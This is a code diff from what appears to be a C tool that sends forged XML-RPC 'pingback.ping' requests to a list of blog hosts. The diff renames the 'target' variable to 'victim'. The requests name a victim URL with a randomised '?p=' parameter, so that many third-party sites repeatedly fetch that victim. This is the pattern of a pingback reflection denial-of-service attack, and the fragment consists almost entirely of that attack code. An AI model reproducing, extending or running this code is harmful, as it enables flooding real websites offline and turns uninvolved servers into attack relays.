@@ -79,7 +79,7 @@ int main(int argc, char *argv[]){
   ccnt = 0;
   srand(time(NULL));
   char random_number[10];
-  char target[30];
+  char victim[30];
   char buff[cnt_lines][MAX];
   struct hostent *host;
   struct sockaddr_in serv_addr;
@@ -87,13 +87,13 @@ int main(int argc, char *argv[]){
     while(cnt < cnt_lines){
       rand_post = rand()%10000 + 1;
       sprintf(random_number, "?p=%d", rand_post);
-      strcpy(target, argv[3]);
-      strcat(target, random_number);
+      strcpy(victim, argv[3]);
+      strcat(victim, random_number);
       char *split_target_uri = strdup(arr_targets[cnt]);
       char *domain = strtok(split_target_uri, "/");
       char *data1 = "<?xml version=\"1.0\"?><methodCall>"
         "<methodName>pingback.ping</methodName><params><param><value><string>http://";
-      char *data2 = target;
+      char *data2 = victim;
       char *data3 = "</string></value></param><param><value><string>http://";
       char *data4 = arr_targets[cnt];
       char *data5 = "</string></value></param></params></methodCall>";
